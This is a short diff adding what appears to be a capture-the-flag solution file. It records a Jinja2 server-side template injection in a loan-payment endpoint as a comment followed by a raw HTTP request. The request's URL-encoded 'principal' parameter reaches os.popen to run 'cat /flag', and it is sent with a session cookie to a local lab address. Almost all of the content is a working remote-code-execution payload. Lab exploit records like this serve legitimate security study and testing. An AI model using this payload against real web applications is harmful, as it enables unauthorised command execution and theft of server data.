@@ -1,0 +1,5 @@
+# Jinja2 SSTI via principal parameter in /total_loan_payments. Template expression in principal param executes os.popen() for RCE. Flag extracted from /flag. Requires valid authenticated session cookie.
+
+GET /total_loan_payments?principal=%7B%7Bconfig.__class__.__init__.__globals__%5B%22os%22%5D.popen%28%22cat+%2Fflag%22%29.read%28%29%7D%7D&payment=1&term=1 HTTP/1.1
+Host: 172.17.0.1:42153
+Cookie: session=eyJ1c2VyX2lkIjoxfQ.adzN_w.Xa8FmQi5_liMoN12MRwtIdq-0bA
